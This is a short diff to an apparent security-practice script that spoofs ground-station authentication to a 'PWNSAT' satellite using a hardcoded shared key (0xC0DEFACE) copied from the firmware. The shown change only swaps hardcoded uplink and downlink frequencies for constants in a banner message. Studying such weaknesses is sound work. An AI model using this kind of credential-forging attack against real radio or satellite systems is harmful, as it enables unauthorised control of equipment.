@@ -48,7 +48,7 @@ _check_gnuradio()
 
 from pwnsat_lora_tx import UPLINK_FREQ_HZ, transmit_packet  # noqa: E402
 from pwnsat_catsniffer_rx import CatSnifferRX  # noqa: E402
-from pwnsat_rtlsdr_rx import RtlSdrRX  # noqa: E402
+from pwnsat_rtlsdr_rx import RtlSdrRX, DOWNLINK_FREQ_HZ  # noqa: E402
 
 GS_ACCESS_APID = 0x12
 GS_SHARED_AUTH_KEY = 0xC0DEFACE  # New-firmware/worker.cpp's gs_shared_auth_key, verbatim
@@ -123,7 +123,8 @@ def main() -> None:
     print("=" * 66)
     print("PWNSAT GS auth spoofing -- forging a session with the hardcoded")
     print(f"gs_shared_auth_key (0x{args.auth_key:08X}), no real credentials involved.")
-    print(f"TX: HackRF (918MHz uplink).  RX: {args.rx_device} (916MHz downlink, continuous).")
+    print(f"TX: HackRF ({UPLINK_FREQ_HZ/1e6:.0f}MHz uplink).  "
+          f"RX: {args.rx_device} ({DOWNLINK_FREQ_HZ/1e6:.0f}MHz downlink, continuous).")
     print("=" * 66)
 
     if args.rx_device == "catsniffer":
